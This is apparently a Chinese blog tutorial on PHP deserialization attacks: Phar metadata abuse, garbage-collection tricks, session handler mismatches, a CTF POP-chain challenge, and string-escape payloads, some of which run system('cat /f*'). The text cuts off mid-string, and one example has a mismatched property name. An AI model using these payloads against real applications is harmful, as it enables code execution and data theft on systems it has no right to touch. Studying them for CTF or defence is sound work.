<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="二-PHAR文件结构"><a href="#二-PHAR文件结构" class="headerlink" title="二. PHAR文件结构"></a>二. PHAR文件结构</h2><p>Phar文件主要包含三至四个部分：</p>
<p>1.a stub stub的基本结构：xxx<?php xxx;__HALT_COMPILER();?>，前面内容不限，可以在前面加上GIF89a,伪造成gif,jpg;但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<p>2.Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点 生成phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>生成的phar文件放入010Editor</p>
<img src="/2023/03/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/a82a98be77e044da8493a77612e08998.png" class="" title="img">![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑

<p><strong>没有经过 serialize但是反序列化已经生成,可以明显的看到meta-data是以序列化的形式存储的。</strong></p>
<h2 id="官方手册"><a href="#官方手册" class="headerlink" title="官方手册"></a>官方手册</h2><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方<img src="/2023/03/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/716ee3b11fbc4b2cbf6ed5fd2231c552.png" class="" title="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
<p>3.<strong>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</strong></p>
<img src="/2023/03/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/dcfb11873d9645d0af059e713d66666d.png" class="" title="img">![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑

<p>Stream API是PHP中一种统一的处理文件的方法，并且其被设计为可扩展的，允许任意扩展作者使用 ，仅仅是知道一些受影响的函数，就够了吗？为什么就可以使用了呢？<a href="https://blog.zsxsoft.com/post/38">请移步这里</a></p>
<p>修改签名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./exp.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># 修改内容后的phar文件</span></span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型以及GBMB标识</span></span><br><span class="line">newf = s+sha1(s).digest()+h <span class="comment"># 数据 + 签名 + 类型 + GBMB</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;exp.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure>



<h2 id="GC回收机制的利用"><a href="#GC回收机制的利用" class="headerlink" title="GC回收机制的利用"></a>GC回收机制的利用</h2><p>在前面讲魔术方法时就提到过一个问题，**__destruct()**无论如何都会被触发，但是前提是必须得完成程序的开始与结束，但是如果程序走了一半，突然报错，那么__destruct()不会触发了，那如果又必须要__destruct()触发又得怎么搞呢？</p>
<p>一些数据或者说是变量在进行某些操作后被置为空(NULL)或者是没有地址(指针)的指向，这种数据一旦被当作垃圾回收后就相当于把一个程序的结尾给划上了句号，那么就不会出现无法调用**__destruct()**方法了</p>
<p>eg</p>
<ol>
<li>$a&#x3D;unserialize($_GET[‘url’]);</li>
<li><strong>throw new Exception(“就这？”);</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr0</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;num = <span class="keyword">new</span> <span class="title function_ invoke__">errorr1</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;err = <span class="keyword">new</span> <span class="title function_ invoke__">errorr2</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr0</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$a</span>,<span class="number">1</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">7</span>:<span class="string">&quot;errorr0&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;errorr1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;err&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;errorr2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;err&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;&#125;i:<span class="number">1</span>;N;&#125;</span><br><span class="line">第一个a为数组，<span class="number">2</span>为数组中键有两个 i = <span class="number">0</span>以及 i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">重点重点重点，虽然有两个键i = <span class="number">0</span>对应的是我们目标对象，i = <span class="number">1</span>是<span class="literal">NULL</span>，如果这个时候我们做一件坏事，把i 本应该等于 <span class="number">1</span>修改为 i = <span class="number">0</span>。那不就是把i = <span class="number">0</span>指向<span class="literal">NULL</span>了吗？然后就实现了GC回收。所以最后我们修改后的字符串为：</span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">7</span>:<span class="string">&quot;errorr0&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;errorr1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;err&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;errorr2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;err&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;&#125;i:<span class="number">0</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="php-session反序列化"><a href="#php-session反序列化" class="headerlink" title="php session反序列化"></a>php session反序列化</h2><p>思路<br>知识点:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> php在session存储和读取时,都会有一个序列化和反序列化的过程,PHP内置了多种处理器用于存取$ _SESSION数据,都会对数据序列化和反序列化,源码中有session_start的时候会读取session,从而进行反序列化.</span><br><span class="line"><span class="number">2</span> php . ini 中默认 session.serialize_handler 为 php_serialize，而 index.php 中将其设置为 php ，这个差异就导致了 sesssion 反序列化问题。</span><br><span class="line"><span class="number">3</span> php有三种处理器对<span class="variable">$_SESSION</span>数据进行序列化和反序列化。</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,php);</span><br><span class="line"></span><br><span class="line">php_binary 键名的长度对应的ascii字符+键名+经过<span class="title function_ invoke__">serialize</span>()函数序列化后的值</span><br><span class="line">php 键名+竖线（|）+经过<span class="title function_ invoke__">serialize</span>()函数处理过的值</span><br><span class="line">php_serialize 经过<span class="title function_ invoke__">serialize</span>()函数处理过的值，会将键名和值当作一个数组序列化</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php.ini里面有较重要的session配置项</span><br><span class="line"></span><br><span class="line">session.save_path=<span class="string">&quot;/tmp&quot;</span>      --设置session文件的存储位置</span><br><span class="line">session.save_handler=files    --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="line">session.auto_start= <span class="number">0</span>          --指定会话模块是否在请求开始时启动一个会话，默认值为 <span class="number">0</span>，不启动</span><br><span class="line">session.serialize_handler= php --定义用来序列化/反序列化的处理器名字，默认使用php  </span><br><span class="line">session.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span><br><span class="line">session.upload_progress.cleanup= oN --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用</span><br></pre></td></tr></table></figure>

<p>php_binary暂时不知道用处，以后知道了补充，或者评论区大神给我说说</p>
<p><strong>在PHP中默认使用的是PHP引擎</strong></p>
<ol>
<li>php_serialize	经过serialize()函数序列化数组</li>
<li>php	键名+竖线+经过serialize()函数处理的值</li>
<li>php_binary	键名的长度对应的ascii字符+键名+serialize()函数序列化的值</li>
</ol>
<p>在 php_serialize 引擎下，session文件中存储的数据为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;spoock&quot;</span>;&#125;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>php 引擎下文件内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">name|s:<span class="number">6</span>:<span class="string">&quot;spoock&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>将反序列化的内容储存到 PHPSESSID临时文件中，用相同的cookie PHPSESSID访问另一个sess_start开启的页面中时会自动进行  ini_set(‘session.serialize_handler’, ‘php_serialize||php’);反序列化。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.43.82/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="地址转换"><a href="#地址转换" class="headerlink" title="地址转换"></a>地址转换</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>=<span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a=&amp;<span class="variable">$a</span>-&gt;b;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125; <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//something in flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __wakeup</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;babyhacker&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __invoke</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$this</span>-&gt;a) &amp;&amp; <span class="variable language_">$this</span>-&gt;a == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">uwant</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;k;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __toString</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cc </span>= <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function uwant</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="variable">$this</span>-&gt;a == <span class="string">&quot;phpinfo&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="variable">$this</span>-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;baby&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;sess&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;sess&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pop&quot;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pop&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;    <span class="keyword">echo</span> <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;baby&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;a)&amp;&amp;<span class="variable language_">$this</span>-&gt;a==<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;cccc&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">uwant</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   <span class="keyword">echo</span> <span class="string">&quot;ddd&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;k;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cc</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cc</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uwant</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a==<span class="string">&quot;phpinfo&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;poc&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;qq&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;R:3;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="php字符逃逸"><a href="#php字符逃逸" class="headerlink" title="php字符逃逸"></a>php字符逃逸</h1><h2 id="增长逃逸"><a href="#增长逃逸" class="headerlink" title="增长逃逸"></a>增长逃逸</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:4:&quot;hack&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$res</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>计算  “;s:4:”pass”;s:4:”hack”;} 的长度</p>
<h2 id="缩短逃逸"><a href="#缩短逃逸" class="headerlink" title="缩短逃逸"></a>缩短逃逸</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&quot;;s:4:&quot;pass&quot;;s:4:&quot;hack&quot;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$res</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">50</span>:<span class="string">&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;hack&quot;</span>;&#125;<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">O:1:&quot;</span>A<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:50:&quot;</span>ccccccccccccccccccccccccc<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:31:&quot;</span><span class="number">123456</span><span class="string">&quot;;s:4:&quot;</span>pass<span 